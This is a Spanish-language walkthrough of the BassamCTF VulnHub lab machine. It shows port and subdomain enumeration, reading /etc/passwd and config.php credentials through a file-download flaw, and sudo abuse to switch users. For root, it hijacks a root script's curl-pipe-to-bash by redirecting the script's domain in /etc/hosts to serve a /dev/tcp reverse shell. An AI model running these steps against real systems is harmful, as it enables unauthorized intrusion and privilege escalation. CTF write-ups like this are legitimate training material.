---
icon: flag
---

# BassamCTF VulnHub

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-23 06:55 EDT
Nmap scan report for 192.168.5.200
Host is up (0.00023s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5f:cd:98:ac:0e:76:be:d0:9c:ae:23:47:8d:03:b5:07 (RSA)
|   256 f5:cb:de:f0:89:dc:ff:56:89:44:05:3c:a3:44:8f:70 (ECDSA)
|_  256 3a:94:cc:9e:aa:ab:7d:64:71:26:49:48:02:07:62:30 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:AD:2C:E8 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.84 seconds
```

SI nos vamos al puerto `80` e inspeccionamos la pagina, veremos lo siguiente...

```html
<!-- bassam.ctf --> 
```

Veremos que es un dominio, por lo que lo meteremos en el `hosts`...

```shell
sudo nano /etc/hosts

#Dentro del nano
<IP>         bassam.ctf
```

Una vez hecho esto ponemos el dominio en el navegador...

```
URL = http://bassam.ctf/
```

### ffuf

```shell
ffuf -c -w <WORDLIST> -u http://bassam.ctf -H "Host: FUZZ.bassam.ctf" -fs 21
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://bassam.ctf
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecList/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.bassam.ctf
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 21
________________________________________________

welcome                 [Status: 200, Size: 38, Words: 4, Lines: 4, Duration: 1ms]
```

Por lo que vemos, vemos un subdominio llamado `welcome`...

Por lo que haremos lo siguiente...

```shell
sudo nano /etc/hosts

#Dentro del nano
<IP>         bassam.ctf welcome.bassam.ctf
```

Una vez hecho esto volveremos al navegador y pondremos eso...

```
URL = http://welcome.bassam.ctf
```

### Gobuster

```shell
gobuster dir -u http://welcome.bassam.ctf/ -w <WORDLIST> -x html,php,txt,md -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://welcome.bassam.ctf/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,md,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.txt        (Status: 403) [Size: 283]
/.htpasswd.md         (Status: 403) [Size: 283]
/.htpasswd            (Status: 403) [Size: 283]
/.htaccess.md         (Status: 403) [Size: 283]
/.htpasswd.txt        (Status: 403) [Size: 283]
/.htpasswd.php        (Status: 403) [Size: 283]
/.htpasswd.html       (Status: 403) [Size: 283]
/.htaccess.html       (Status: 403) [Size: 283]
/.htaccess.php        (Status: 403) [Size: 283]
/.htaccess            (Status: 403) [Size: 283]
/config.php           (Status: 200) [Size: 0]
/index.html           (Status: 200) [Size: 38]
/index.php            (Status: 200) [Size: 229]
/server-status        (Status: 403) [Size: 283]
Progress: 102345 / 102350 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos varias cosas interesantes, pero si ponemos `/index.php` veremos un recuadro pidiendo una `URL`...

Si en ese espacio metemos por ejemplo `/etc/passwd` se nos descargara el archivo...

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
kira:x:1000:1000:kira:/home/kira:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
bassam:x:1001:1001::/home/bassam:/bin/sh
test:x:1002:1002::/home/test:/bin/sh
```

Pero si metemos el `/config.php` que nos encontramos con `gobuster` el cual puede contener credenciales, tambien nos lo descargara...

```php
<?php
$user='test';
$pass='test123';
?>
```

Por lo que vemos nos da unas credenciales...

Si pobramos eso a conectarnos por `ssh` veremos que son las credenciales validas...

```shell
ssh test@<IP>
```

Y metiendo la contraseña ya estariamos dentro...

Si nos vamos a la siguiente ubicacion...

```shell
cd /var/www/ctf
```

Veremos un archivo llamado `MySecretPassword` pero si lo vemos con `cat` solo veremos espacion y nada asi interesante, por lo que podria ser un mensaje codificado en espacios y tiene que ser interpretado mediante un patron...

```shell
cat -A MySecretPassword
```

Info:

```
                                                                                                           $
                                                                                                         $
                                                                                                                  $
                                                                                                 $
                                                  $
                                                $
                                                $
                                                   $
```

Por lo que se ve sigue un patron, por lo que haremos lo siguiente...

```shell
nano /tmp/decode.sh

#Dentro del nano
#!/bin/bash

while IFS= read -r line; do
    count=$(echo "$line" | grep -o ' ' | wc -l)
    if [ "$count" -gt 32 ]; then
        # Assuming a basic offset of 32 (for space character in ASCII)
        ascii=$((count))
        printf "%d " "$ascii"
    else
        printf "%s" "$line"
    fi
done < MySecretPassword
echo
```

```shell
chmod +x /tmp/decode.sh
```

```shell
/tmp/decode.sh
```

Info:

```
107 105 114 97 50 48 48 51
```

Nos dara esos numeros en `hexadecimal` por lo que lo pasaremos a `ascii` de la siguiente forma...

```shell
nano /tmp/ascii.sh

#Dentro del nano
#!/bin/bash

# Números obtenidos
numbers=(107 105 114 97 50 48 48 51)

# Convertir cada número a un carácter
for num in "${numbers[@]}"; do
    printf "\\$(printf %o "$num")"
done
echo
```

```shell
chmod +x /tmp/ascii.sh
```

```shell
/tmp/ascii.sh
```

Info:

```
kira2003
```

Por lo que veremos la contraseña del usuario `kira` es `kira2003`...

```
User = kira
Password = kira2003
```

Si hacemos `sudo -l` veremos lo siguiente...

```
Matching Defaults entries for kira on kira:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kira may run the following commands on kira:
    (bassam) /home/kira/test.sh
```

Podremos ejecutar como `bassam` el `.sh`...

Dentro de la carpeta de `kira` haremos lo siguiente...

```shell
nano shell.sh

#Dentro del nano
#!/bin/bash

/bin/bash
```

```shell
chmod +x shell.sh
```

```shell
sudo -u bassam /home/kira/test.sh /home/kira/shell.sh
```

Info:

```
your name
bash  
/home/kira/test.sh: 3: /home/kira/test.sh: cannot create /home/kali/message.txt: Directory nonexistent

whoami
bassam
```

Por lo que ya seriamos el usuario `bassam` ahora nos importamos una shell mas bonita...

```shell
script /dev/null -c bash
```

Si hacemos `sudo -l` veremos lo siguiente...

```
Matching Defaults entries for bassam on kira:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bassam may run the following commands on kira:
    (root) NOPASSWD: /home/bassam/down.sh
```

Podemos ejecutar ese `.sh` como el usuario `root`...

Veremos como es por dentro ese `script.sh`...

```bash
curl "http://mywebsite.test/script.sh" |bash
```

Vemos que esta haciendo una llamada con `curl` a un sitio web que no existe resuelto por un dominio para ver el contenido de ese `script.sh` pero a la vez esta ejecutando con `bash` lo que haya en su interior, por lo que si cogemos ese dominio y lo resolvemos para que haga conexion en nuestra maquina con el `script` malicioso que pongamos lo ejecutara como `root`...

En nuestra maquina `host` crearemos el siguiente archivo...

```shell
nano script.sh

#Dentro del nano
#!/bin/bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

```shell
chmod +x script.sh
```

Abrimos un servidor de `python3` para que `curl` lo pueda coger...

```shell
python3 -m http.server 80
```

Y a la vez estaremos a la escucha...

```shell
nc -lvnp <PORT>
```

Si dentro de la maquina victima hacemos lo siguiente...

```shell
nano /etc/hosts

#Dentro del nano
<IP_ATACANTE>      mywebsite.test
```

Veremos que si podemos guardarlo para que cuando se ejecute el script se este ejecutando en nuestra `IP` de nuestro `hosts` donde tenemos ese `script.sh` malicioso con una `Reverse Shell`...

```shell
sudo /home/bassam/down.sh
```

Info:

```
 % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    56  100    56    0     0   3111      0 --:--:-- --:--:-- --:--:--  3111

```

Se quedara pensando y si nos vamos a donde teniamos la escucha, veremos que nos hizo una shell con `root` perfectamente...

```
connect to [192.168.5.199] from (UNKNOWN) [192.168.5.200] 54748
root@kira:/home/bassam# whoami
whoami
root
```

Por lo que ya seriamos `root`...
